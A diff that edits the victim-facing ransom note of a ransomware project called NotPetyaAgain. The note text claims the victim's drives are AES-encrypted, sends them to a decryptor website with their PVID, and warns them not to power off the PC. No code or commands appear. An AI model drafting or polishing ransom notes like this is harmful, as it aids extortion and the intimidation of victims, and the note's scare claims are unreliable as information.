@@ -1,4 +1,5 @@
 OOPS! You became a victim of the NOTPETYAAGAIN RANSOMWARE!
+
 ██████████████████████████████████████████████████████████████████████
 The drives of your computer have been encrypted with an advanced
 military grade encryption algorithm known as AES. It is not possible
@@ -12,8 +13,7 @@ steps:
 2) Go to https://decryptor.octobyte.cloud to generate your key.
 3) Enter your PVID via the provided website and the decryption key
 will be provided.
-4) Enter the decryption key below and NotPetyaAgain will decrypt your
-system.
+4) Enter the key below and NotPetyaAgain will decrypt the system.
 
 IMPORTANT: Once decryption begins, DO NOT RESTART OR POWER OFF YOUR PC
 UNTIL THE DECRYPTION ROUTINE IS COMPLETE!
